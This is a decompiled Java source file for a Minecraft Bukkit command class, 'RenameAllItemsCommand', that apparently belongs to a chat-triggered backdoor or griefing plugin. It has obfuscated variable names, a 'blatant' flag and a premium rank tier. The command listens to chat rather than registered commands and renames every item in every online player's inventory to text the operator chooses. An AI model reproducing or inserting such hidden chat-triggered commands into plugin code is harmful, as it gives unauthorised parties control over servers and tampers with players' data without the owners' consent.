package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;

@CommandInfo(
   name = "renameall",
   description = "Renames everyone's items",
   blatant = true,
   rank = Rank.PREMIUM
)
public class RenameAllItemsCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use renameall <name>");
      } else {
         for(Player var5 : Bukkit.getOnlinePlayers()) {
            for(ItemStack var9 : var5.getInventory().getContents()) {
               if (var9 != null) {
                  ItemMeta var10 = var9.getItemMeta();
                  var10.setDisplayName(ChatColor.translateAlternateColorCodes('&', String.join(" ", var3)));
                  var9.setItemMeta(var10);
               }
            }
         }

         ChatUtil.sendChat(var1.getPlayer(), "All players items have been renamed successfully!");
      }
   }
}
